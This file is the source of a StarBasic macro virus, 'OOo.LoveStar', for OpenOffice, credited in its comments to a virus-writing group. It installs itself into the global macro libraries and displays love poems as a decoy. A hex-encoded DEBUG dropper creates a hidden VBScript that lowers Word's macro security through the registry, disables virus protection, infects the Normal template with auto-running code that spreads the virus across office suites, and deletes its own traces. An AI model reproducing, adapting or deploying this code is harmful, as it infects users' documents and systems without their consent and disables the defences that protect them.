<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="lovestar" script:language="StarBasic">Const GLOBAL_LIBRARY = True
Const DOCUMENT_LIBRARY = False
Const DIALOG_MODULE = True
Const BASIC_MODULE = False

Public sInstall As String
Public sInstallTitle As String

Sub InstallGlobalModule( ByVal cGlobalLibName As String,Optional cDocumentLibName,Optional lovestar )
&apos;********************************
&apos;****      OOo.LoveStar      ****
&apos;********************************
&apos;*(c) by Necronomikon/D00MRiderz*
&apos;********************************
oDocument = ThisComponent
com.sun.star.document.MacroExecMode.ALWAYS_EXECUTE_NO_WARN
ThisComponent.LockControllers 

If IsMissing( cDocumentLibName ) Then
cDocumentLibName = cGlobalLibName
EndIf

If IsMissing( lovestar ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE )
InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE )
Else
If DoesModuleExist( cDocumentLibName, lovestar, DOCUMENT_LIBRARY, DIALOG_MODULE ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, DIALOG_MODULE, lovestar )
		
ElseIf DoesModuleExist( cDocumentLibName, lovestar, DOCUMENT_LIBRARY, BASIC_MODULE ) Then
InstallGlobalModule( cGlobalLibName, cDocumentLibName, BASIC_MODULE, lovestar )
		
Else
EndIf
EndIf
call dropper
 payload
oDocument.store()
End Sub

Sub payload()
Dim Style as Integer
Dim lang As Integer
Select case lang
case de 
msgDE
case pl 
msgPL
case else 
msgELSE
end select

Style = MSGBOX_OK + MSGBOX_ICON_EXCLAMATION &apos;OKonly + Exclamation
MsgBox (sInstall, Style, sInstallTitle)
End Sub

Sub msgDE()
Dim aLanguage As New com.sun.star.lang.Locale
aLanguage.Language = de
	sInstall = &quot;Wie sich die Rebenranken schwingen&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;In der linden Lüfte Hauch,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Wie sich weiße Winden Schlingen&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Luftig um den Rosenstrauch.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Also schmiegen sich und ranken&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Frühlingsselig, still und mild&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Meine Tag- und Nachtgedanken&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Um ein trautes liebes Bild.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;----------------------------------------------&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;(c)Hoffmann von Fallersleben&quot;            
sInstallTitle = &quot;LoveStar&quot;
End Sub
Sub msgPL()
aLanguage.Language = &quot;pl&quot;
sInstall = &quot;Moja pieszczotka, gdy w weso?ej chwili&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Pocznie szczebiota? i kwili?, i grucha?.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Tak mile grucha, szczebioce i kwili,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;?e nie chc?c s?ówka ?adnego postrada?,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Nie ?miem przerywa?, nie ?miem odpowiada?,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;I tylko chcia?bym s?ucha?, s?ucha?, s?ucha?.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Lecz mowy ?ywo?? gdy oczki zapali&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;I pocznie mocniej jagody ró?owa?,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Per?owe z?bki b?ysn? ?ród korali,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Ach! wtenczas ?mielej w ocz?ta pogl?dam,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Usta pomykam i s?ucha? nie ??dam,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Tylko ca?owa?, ca?owa?, ca?owa?.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;-----------------------------------------------------&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;(c)Adam Mickiewicz&quot;
	sInstallTitle = &quot;LoveStar&quot;
End Sub
Sub MsgElse()  &apos;...in english
aLanguage.Language = &quot;eng&quot;
sInstall = &quot;My mistress&apos; eyes are nothing like the sun;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Coral is far more red than her lips&apos; red:&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;If snow be white, why then her breasts are dun;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;If hairs be wires, black wires grow on her head.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;I have seen roses damasked, red and white,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;But no such roses see I in her cheeks;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;And in some perfumes is there more delight&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;Than in the breath that from my mistress reeks.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;I love to hear her speak; yet well I know&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;That music hath a far more pleasing sound:&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;I grant I never saw a goddess go,&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;My mistress, when she walks, treads on the ground&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;And yet, by heaven, I think my love as rate&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;As any she belied with false compare.&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;---------------------------------------------------------------&quot;  &amp; Chr(13) &amp; Chr(10) _
&amp; &quot;(c)William Shakespeare&quot;
sInstallTitle = &quot;LoveStar&quot;
end sub

Sub Dropper()
Open &quot;c:\drop.nec&quot; For Output As #1
Print #1, &quot;e 0100  4F 6E 20 45 72 72 6F 72 20 52 65 73 75 6D 65 20&quot;
Print #1, &quot;e 0110  4E 65 78 74 0D 0A 27 53 58 57 2F 57 6F 72 64 39&quot;
Print #1, &quot;e 0120  37 2E 4C 6F 76 65 53 74 61 72 0D 0A 27 28 63 29&quot;
Print #1, &quot;e 0130  62 79 20 4E 65 63 72 6F 6E 6F 6D 69 6B 6F 6E 2F&quot;
Print #1, &quot;e 0140  44 30 30 6D 52 69 64 65 72 7A 0D 0A 64 69 6D 20&quot;
Print #1, &quot;e 0150  76 61 72 31 2C 20 76 61 72 32 2C 20 76 61 72 33&quot;
Print #1, &quot;e 0160  2C 20 76 61 72 34 2C 20 76 61 72 35 2C 20 76 61&quot;
Print #1, &quot;e 0170  72 36 2C 76 61 72 78 31 2C 20 76 61 72 78 32 0D&quot;
Print #1, &quot;e 0180  0A 56 41 52 31 3D 22 53 63 72 22 0D 0A 56 41 52&quot;
Print #1, &quot;e 0190  32 3D 22 69 70 74 22 0D 0A 56 41 52 33 3D 22 69&quot;
Print #1, &quot;e 01A0  6E 67 2E 22 0D 0A 56 41 52 34 3D 22 46 69 22 0D&quot;
Print #1, &quot;e 01B0  0A 56 41 52 35 3D 22 6C 65 73 79 73 22 0D 0A 56&quot;
Print #1, &quot;e 01C0  41 52 36 3D 22 74 65 6D 4F 62 22 0D 0A 53 65 74&quot;
Print #1, &quot;e 01D0  20 66 73 6F 20 3D 20 43 72 65 61 74 65 4F 62 6A&quot;
Print #1, &quot;e 01E0  65 63 74 28 56 41 52 31 2B 56 41 52 32 2B 56 41&quot;
Print #1, &quot;e 01F0  52 33 2B 56 41 52 34 2B 56 41 52 35 2B 56 41 52&quot;
Print #1, &quot;e 0200  36 2B 22 6A 65 63 74 22 29 0D 0A 53 65 74 20 66&quot;
Print #1, &quot;e 0210  73 6F 20 3D 20 43 72 65 61 74 65 4F 62 6A 65 63&quot;
Print #1, &quot;e 0220  74 28 56 41 52 31 2B 56 41 52 32 2B 56 41 52 33&quot;
Print #1, &quot;e 0230  2B 56 41 52 34 2B 56 41 52 35 2B 56 41 52 36 2B&quot;
Print #1, &quot;e 0240  22 6A 65 63 74 22 29 0D 0A 56 41 52 58 31 3D 22&quot;
Print #1, &quot;e 0250  53 22 0D 0A 56 41 52 58 32 3D 22 68 65 6C 6C 22&quot;
Print #1, &quot;e 0260  0D 0A 53 65 74 20 57 53 48 53 68 65 6C 6C 20 3D&quot;
Print #1, &quot;e 0270  20 57 53 63 72 69 70 74 2E 43 72 65 61 74 65 4F&quot;
Print #1, &quot;e 0280  62 6A 65 63 74 28 22 57 22 2B 56 41 52 31 2B 56&quot;
Print #1, &quot;e 0290  41 52 32 2B 22 2E 22 2B 56 41 52 58 31 2B 56 41&quot;
Print #1, &quot;e 02A0  52 58 32 29 0D 0A 52 65 67 50 61 74 68 20 3D 20&quot;
Print #1, &quot;e 02B0  22 48 4B 43 55 5C 53 6F 66 74 77 61 72 65 5C 4D&quot;
Print #1, &quot;e 02C0  69 63 72 6F 73 6F 66 74 5C 4F 66 66 69 63 65 5C&quot;
Print #1, &quot;e 02D0  22 20 26 20 57 6F 72 64 2E 41 70 70 6C 69 63 61&quot;
Print #1, &quot;e 02E0  74 69 6F 6E 2E 56 65 72 73 69 6F 6E 20 26 20 22&quot;
Print #1, &quot;e 02F0  5C 57 6F 72 64 5C 53 65 63 75 72 69 74 79 5C 22&quot;
Print #1, &quot;e 0300  0D 0A 57 53 48 53 68 65 6C 6C 2E 52 65 67 57 72&quot;
Print #1, &quot;e 0310  69 74 65 20 52 65 67 50 61 74 68 20 26 20 22 4C&quot;
Print #1, &quot;e 0320  65 76 65 6C 22 2C 20 31 2C 20 22 52 45 47 5F 44&quot;
Print #1, &quot;e 0330  57 4F 52 44 22 0D 0A 57 53 48 53 68 65 6C 6C 2E&quot;
Print #1, &quot;e 0340  52 65 67 57 72 69 74 65 20 52 65 67 50 61 74 68&quot;
Print #1, &quot;e 0350  20 26 20 22 41 63 63 65 73 73 56 42 4F 4D 22 2C&quot;
Print #1, &quot;e 0360  20 31 2C 20 22 52 45 47 5F 44 57 4F 52 44 22 0D&quot;
Print #1, &quot;e 0370  0A 53 65 74 20 42 61 63 6B 75 70 20 3D 20 57 53&quot;
Print #1, &quot;e 0380  63 72 69 70 74 2E 43 72 65 61 74 65 4F 62 6A 65&quot;
Print #1, &quot;e 0390  63 74 28 22 57 6F 72 64 2E 41 70 70 6C 69 63 61&quot;
Print #1, &quot;e 03A0  74 69 6F 6E 22 29 0D 0A 42 61 63 6B 75 70 2E 4F&quot;
Print #1, &quot;e 03B0  70 74 69 6F 6E 73 2E 56 69 72 75 73 50 72 6F 74&quot;
Print #1, &quot;e 03C0  65 63 74 69 6F 6E 20 3D 20 28 52 6E 64 20 2A 20&quot;
Print #1, &quot;e 03D0  30 29 0D 0A 42 61 63 6B 75 70 2E 4F 70 74 69 6F&quot;
Print #1, &quot;e 03E0  6E 73 2E 53 61 76 65 4E 6F 72 6D 61 6C 50 72 6F&quot;
Print #1, &quot;e 03F0  6D 70 74 20 3D 20 28 52 6E 64 20 2A 20 30 29 0D&quot;
Print #1, &quot;e 0400  0A 53 65 74 20 62 61 62 65 20 3D 20 66 73 6F 2E&quot;
Print #1, &quot;e 0410  4F 70 65 6E 54 65 78 74 46 69 6C 65 28 57 53 63&quot;
Print #1, &quot;e 0420  72 69 70 74 2E 53 63 72 69 70 74 46 75 6C 6C 4E&quot;
Print #1, &quot;e 0430  61 6D 65 2C 20 31 29 0D 0A 53 63 72 69 70 74 52&quot;
Print #1, &quot;e 0440  65 61 64 31 36 20 3D 20 62 61 62 65 2E 52 65 61&quot;
Print #1, &quot;e 0450  64 41 6C 6C 0D 0A 62 61 62 65 2E 43 6C 6F 73 65&quot;
Print #1, &quot;e 0460  0D 0A 0D 0A 53 65 74 20 44 72 6F 70 46 69 6C 65&quot;
Print #1, &quot;e 0470  20 3D 20 46 53 4F 2E 43 72 65 61 74 65 54 65 78&quot;
Print #1, &quot;e 0480  74 46 69 6C 65 28 22 63 3A 5C 69 6E 6C 6F 76 65&quot;
Print #1, &quot;e 0490  2E 64 72 76 22 2C 20 54 72 75 65 29 0D 0A 44 72&quot;
Print #1, &quot;e 04A0  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65&quot;
Print #1, &quot;e 04B0  20 22 53 75 62 20 41 75 74 6F 4F 70 65 6E 28 29&quot;
Print #1, &quot;e 04C0  22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74&quot;
Print #1, &quot;e 04D0  65 4C 69 6E 65 20 22 4F 6E 20 45 72 72 6F 72 20&quot;
Print #1, &quot;e 04E0  52 65 73 75 6D 65 20 4E 65 78 74 22 0D 0A 44 72&quot;
Print #1, &quot;e 04F0  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65&quot;
Print #1, &quot;e 0500  20 22 44 69 6D 20 6E 65 63 28 29 20 41 73 20 42&quot;
Print #1, &quot;e 0510  79 74 65 22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57&quot;
Print #1, &quot;e 0520  72 69 74 65 4C 69 6E 65 20 22 72 65 6D 20 53 58&quot;
Print #1, &quot;e 0530  57 2F 57 4D 39 37 2E 4C 6F 76 65 53 74 61 72 22&quot;
Print #1, &quot;e 0540  0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65&quot;
Print #1, &quot;e 0550  4C 69 6E 65 20 22 72 65 6D 20 28 63 29 20 62 79&quot;
Print #1, &quot;e 0560  20 4E 65 63 72 6F 6E 6F 6D 69 6B 6F 6E 2F 44 30&quot;
Print #1, &quot;e 0570  30 6D 52 69 64 65 72 7A 22 0D 0A 44 72 6F 70 46&quot;
Print #1, &quot;e 0580  69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20 22 4F&quot;
Print #1, &quot;e 0590  70 65 6E 20 22 22 63 3A 5C 6C 6F 76 65 73 74 61&quot;
Print #1, &quot;e 05A0  72 2E 73 78 77 22 22 20 46 6F 72 20 42 69 6E 61&quot;
Print #1, &quot;e 05B0  72 79 20 41 63 63 65 73 73 20 52 65 61 64 20 41&quot;
Print #1, &quot;e 05C0  73 20 23 31 22 0D 0A 44 72 6F 70 46 69 6C 65 2E&quot;
Print #1, &quot;e 05D0  57 72 69 74 65 4C 69 6E 65 20 22 52 65 44 69 6D&quot;
Print #1, &quot;e 05E0  20 6E 65 63 28 31 30 38 34 38 29 22 0D 0A 44 72&quot;
Print #1, &quot;e 05F0  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65&quot;
Print #1, &quot;e 0600  20 22 47 65 74 20 23 31 2C 20 2C 20 6E 65 63 22&quot;
Print #1, &quot;e 0610  0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65&quot;
Print #1, &quot;e 0620  4C 69 6E 65 20 22 43 6C 6F 73 65 20 23 31 22 0D&quot;
Print #1, &quot;e 0630  0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65 4C&quot;
Print #1, &quot;e 0640  69 6E 65 20 22 4F 70 65 6E 20 22 22 43 3A 5C 6C&quot;
Print #1, &quot;e 0650  6F 76 65 73 74 61 72 2E 64 6F 63 22 22 20 46 6F&quot;
Print #1, &quot;e 0660  72 20 42 69 6E 61 72 79 20 41 63 63 65 73 73 20&quot;
Print #1, &quot;e 0670  57 72 69 74 65 20 41 73 20 23 31 22 0D 0A 44 72&quot;
Print #1, &quot;e 0680  6F 70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65&quot;
Print #1, &quot;e 0690  20 22 50 75 74 20 23 31 2C 20 33 39 34 37 35 33&quot;
Print #1, &quot;e 06A0  2C 20 6E 65 63 22 20 0D 0A 44 72 6F 70 46 69 6C&quot;
Print #1, &quot;e 06B0  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 43 6C 6F&quot;
Print #1, &quot;e 06C0  73 65 20 23 31 22 0D 0A 44 72 6F 70 46 69 6C 65&quot;
Print #1, &quot;e 06D0  2E 57 72 69 74 65 4C 69 6E 65 20 22 6B 69 6C 6C&quot;
Print #1, &quot;e 06E0  20 22 22 63 3A 5C 69 6E 6C 6F 76 65 2E 64 72 76&quot;
Print #1, &quot;e 06F0  22 22 22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72&quot;
Print #1, &quot;e 0700  69 74 65 4C 69 6E 65 20 22 45 6E 64 20 53 75 62&quot;
Print #1, &quot;e 0710  22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74&quot;
Print #1, &quot;e 0720  65 4C 69 6E 65 20 22 53 75 62 20 41 75 74 6F 45&quot;
Print #1, &quot;e 0730  78 69 74 28 29 22 0D 0A 44 72 6F 70 46 69 6C 65&quot;
Print #1, &quot;e 0740  2E 57 72 69 74 65 4C 69 6E 65 20 22 4F 6E 20 45&quot;
Print #1, &quot;e 0750  72 72 6F 72 20 52 65 73 75 6D 65 20 4E 65 78 74&quot;
Print #1, &quot;e 0760  22 0D 0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74&quot;
Print #1, &quot;e 0770  65 4C 69 6E 65 20 22 43 68 61 6E 67 65 46 69 6C&quot;
Print #1, &quot;e 0780  65 4F 70 65 6E 44 69 72 65 63 74 6F 72 79 20 22&quot;
Print #1, &quot;e 0790  22 43 3A 5C 22 22 22 0D 0A 44 72 6F 70 46 69 6C&quot;
Print #1, &quot;e 07A0  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 44 6F 63&quot;
Print #1, &quot;e 07B0  75 6D 65 6E 74 73 2E 4F 70 65 6E 20 46 69 6C 65&quot;
Print #1, &quot;e 07C0  4E 61 6D 65 3A 3D 22 22 6C 6F 76 65 73 74 61 72&quot;
Print #1, &quot;e 07D0  2E 64 6F 63 22 22 2C 20 43 6F 6E 66 69 72 6D 43&quot;
Print #1, &quot;e 07E0  6F 6E 76 65 72 73 69 6F 6E 73 3A 3D 46 61 6C 73&quot;
Print #1, &quot;e 07F0  65 2C 20 5F 22 0D 0A 44 72 6F 70 46 69 6C 65 2E&quot;
Print #1, &quot;e 0800  57 72 69 74 65 4C 69 6E 65 20 22 52 65 61 64 4F&quot;
Print #1, &quot;e 0810  6E 6C 79 3A 3D 46 61 6C 73 65 2C 20 41 64 64 54&quot;
Print #1, &quot;e 0820  6F 52 65 63 65 6E 74 46 69 6C 65 73 3A 3D 46 61&quot;
Print #1, &quot;e 0830  6C 73 65 2C 20 50 61 73 73 77 6F 72 64 44 6F 63&quot;
Print #1, &quot;e 0840  75 6D 65 6E 74 3A 3D 22 22 22 22 2C 20 5F 22 0D&quot;
Print #1, &quot;e 0850  0A 44 72 6F 70 46 69 6C 65 2E 57 72 69 74 65 4C&quot;
Print #1, &quot;e 0860  69 6E 65 20 22 50 61 73 73 77 6F 72 64 54 65 6D&quot;
Print #1, &quot;e 0870  70 6C 61 74 65 3A 3D 22 22 22 22 2C 20 52 65 76&quot;
Print #1, &quot;e 0880  65 72 74 3A 3D 46 61 6C 73 65 2C 20 57 72 69 74&quot;
Print #1, &quot;e 0890  65 50 61 73 73 77 6F 72 64 44 6F 63 75 6D 65 6E&quot;
Print #1, &quot;e 08A0  74 3A 3D 22 22 22 22 2C 20 5F 22 0D 0A 44 72 6F&quot;
Print #1, &quot;e 08B0  70 46 69 6C 65 2E 57 72 69 74 65 4C 69 6E 65 20&quot;
Print #1, &quot;e 08C0  22 57 72 69 74 65 50 61 73 73 77 6F 72 64 54 65&quot;
Print #1, &quot;e 08D0  6D 70 6C 61 74 65 3A 3D 22 22 22 22 2C 20 46 6F&quot;
Print #1, &quot;e 08E0  72 6D 61 74 3A 3D 77 64 4F 70 65 6E 46 6F 72 6D&quot;
Print #1, &quot;e 08F0  61 74 41 75 74 6F 22 0D 0A 44 72 6F 70 46 69 6C&quot;
Print #1, &quot;e 0900  65 2E 57 72 69 74 65 4C 69 6E 65 20 22 45 6E 64&quot;
Print #1, &quot;e 0910  20 53 75 62 22 0D 0A 44 72 6F 70 46 69 6C 65 2E&quot;
Print #1, &quot;e 0920  43 6C 6F 73 65 0D 0A 42 61 63 6B 75 70 2E 56 69&quot;
Print #1, &quot;e 0930  73 69 62 6C 65 20 3D 20 46 61 6C 73 65 0D 0A 53&quot;
Print #1, &quot;e 0940  65 74 20 6E 74 20 3D 20 42 61 63 6B 75 70 2E 4E&quot;
Print #1, &quot;e 0950  6F 72 6D 61 6C 54 65 6D 70 6C 61 74 65 2E 76 62&quot;
Print #1, &quot;e 0960  70 72 6F 6A 65 63 74 2E 76 62 63 6F 6D 70 6F 6E&quot;
Print #1, &quot;e 0970  65 6E 74 73 28 31 29 2E 63 6F 64 65 6D 6F 64 75&quot;
Print #1, &quot;e 0980  6C 65 0D 0A 53 65 74 20 69 77 20 3D 20 66 73 6F&quot;
Print #1, &quot;e 0990  2E 4F 70 65 6E 54 65 78 74 46 69 6C 65 28 22 63&quot;
Print #1, &quot;e 09A0  3A 5C 69 6E 6C 6F 76 65 2E 64 72 76 22 2C 20 31&quot;
Print #1, &quot;e 09B0  2C 20 54 72 75 65 29 0D 0A 6E 74 2E 44 65 6C 65&quot;
Print #1, &quot;e 09C0  74 65 4C 69 6E 65 73 20 31 2C 20 6E 74 2E 43 6F&quot;
Print #1, &quot;e 09D0  75 6E 74 4F 66 4C 69 6E 65 73 0D 0A 69 20 3D 20&quot;
Print #1, &quot;e 09E0  31 0D 0A 44 6F 20 57 68 69 6C 65 20 69 77 2E 61&quot;
Print #1, &quot;e 09F0  74 65 6E 64 6F 66 73 74 72 65 61 6D 20 3C 3E 20&quot;
Print #1, &quot;e 0A00  54 72 75 65 0D 0A 62 20 3D 20 69 77 2E 72 65 61&quot;
Print #1, &quot;e 0A10  64 6C 69 6E 65 0D 0A 6E 74 2E 49 6E 73 65 72 74&quot;
Print #1, &quot;e 0A20  4C 69 6E 65 73 20 69 2C 20 62 0D 0A 69 20 3D 20&quot;
Print #1, &quot;e 0A30  69 20 2B 20 31 0D 0A 4C 6F 6F 70 0D 0A 42 61 63&quot;
Print #1, &quot;e 0A40  6B 75 70 2E 4E 6F 72 6D 61 6C 54 65 6D 70 6C 61&quot;
Print #1, &quot;e 0A50  74 65 2E 53 61 76 65 0D 0A 53 65 74 41 74 74 72&quot;
Print #1, &quot;e 0A60  20 6F 77 6F 72 64 2E 4E 6F 72 6D 61 6C 54 65 6D&quot;
Print #1, &quot;e 0A70  70 6C 61 74 65 2E 46 75 6C 6C 6E 61 6D 65 2C 20&quot;
Print #1, &quot;e 0A80  76 62 52 65 61 64 4F 6E 6C 79 0D 0A 42 61 63 6B&quot;
Print #1, &quot;e 0A90  75 70 2E 4E 6F 72 6D 61 6C 54 65 6D 70 6C 61 74&quot;
Print #1, &quot;e 0AA0  65 2E 43 6C 6F 73 65 0D 0A 66 73 6F 2E 44 65 6C&quot;
Print #1, &quot;e 0AB0  65 74 65 46 69 6C 65 20 28 22 63 3A 5C 64 62 70&quot;
Print #1, &quot;e 0AC0  61 79 2E 42 41 54 22 29 0D 0A 66 73 6F 2E 44 65&quot;
Print #1, &quot;e 0AD0  6C 65 74 65 46 69 6C 65 20 28 22 63 3A 5C 64 72&quot;
Print #1, &quot;e 0AE0  6F 70 2E 6E 65 63 22 29 0D 0A 66 73 6F 2E 44 65&quot;
Print #1, &quot;e 0AF0  6C 65 74 65 46 69 6C 65 20 77 73 63 72 69 70 74&quot;
Print #1, &quot;e 0B00  2E 53 63 72 69 70 74 46 75 6C 6C 4E 61 6D 65 00&quot;
Print #1, &quot;rcx&quot;
Print #1, &quot;A0F&quot;
Print #1, &quot;nC:\dropme.vbs&quot;
Print #1, &quot;w&quot;
Print #1, &quot;q&quot;
Close #1
Open &quot;c:\dbpay.BAT&quot; For Output As #2
Print #2, &quot;rem Eat this payload....&quot;
Print #2, &quot;DEBUG&lt;drop.nec&gt;NUL&quot;
Close #2
wait 2000
Shell(&quot;c:\dbpay.BAT&quot;,0) 
wait 2000
Shell(&quot;c:\dropme.vbs&quot;,0) 
End Sub


Function DoesModuleExist( ByVal cLibraryName As String,_
							ByVal lovestar As String,_
							ByVal bGlobal As Boolean,_
							ByVal bDialog As Boolean _
							) As Boolean	
If bGlobal Then
If bDialog Then
oLibs = GlobalScope.DialogLibraries

Else
oLibs = GlobalScope.BasicLibraries
EndIf

Else
If bDialog Then
oLibs = DialogLibraries

Else
oLibs = BasicLibraries
EndIf
EndIf
	
bExists = False
If oLibs.hasByName( cLibraryName ) Then
oLib = oLibs.getByName( cLibraryName )
If oLib.hasByName( lovestar ) Then
bExists = True
EndIf
EndIf
DoesModuleExist() = bExists
End Function

</script:module>